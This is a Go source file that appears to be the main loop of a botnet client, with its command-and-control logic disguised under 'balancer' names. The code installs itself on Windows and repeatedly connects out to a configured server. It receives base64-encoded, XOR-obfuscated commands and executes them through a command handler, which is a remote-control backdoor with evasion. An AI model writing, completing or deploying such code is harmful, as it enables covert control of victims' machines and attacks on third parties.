package main

import (
	"bytes"
	"encoding/base64"
	"fmt"
	"homo/client/balancer"
	"homo/client/config"
	"homo/client/installer"
	"net"
	"os/exec"
	"runtime"
	"time"
)

type BalancerStats struct {
	Latency string
	Cpu     int
	Memory  int
}

func main() {
	defer func() { // try catch
		if er := recover(); er != nil {
			fmt.Print(er)
			return
		}
	}()

	if runtime.GOOS == "windows" {
		installer.InstallerWin()
	}
	exec.Command("ulimit", "-n", "99999")
	exec.Command("ulimit", "-n", "999999")

CONNECT:
	connection, err := net.Dial("tcp", config.TARGET_SERVER+":"+config.TARGET_PORT)

	if err != nil {
		fmt.Println(err)
		time.Sleep(1 * time.Second)
		goto CONNECT
	}

	lat, cpu, mem, _ := balancer.GetStats()

	b := NewStats(lat, cpu, mem)

	for {

		command := make([]byte, 6000)

		_, err := connection.Read(command)
		if err != nil {
			goto CONNECT
		}

		if bytes.HasPrefix(command, []byte{112, 105, 110, 103}) { // ping message
			continue
		}

		if bytes.HasPrefix(command, []byte{0, 0, 0, 0, 0, 0, 0}) { // nil message
			continue
		}

		var cmd string
		_command, _ := base64.RawStdEncoding.DecodeString(string(command))

		for _, i := range _command {
			cmd += string(i ^ 29>>3)
		}

		CommandHandler(cmd)
		balancer.Balancer(b.Cpu, b.Latency, b.Memory)
	}
}

func NewStats(latency string, cpu, memory int) *BalancerStats {

	return &BalancerStats{
		Latency: latency,
		Cpu:     cpu,
		Memory:  memory,
	}
}
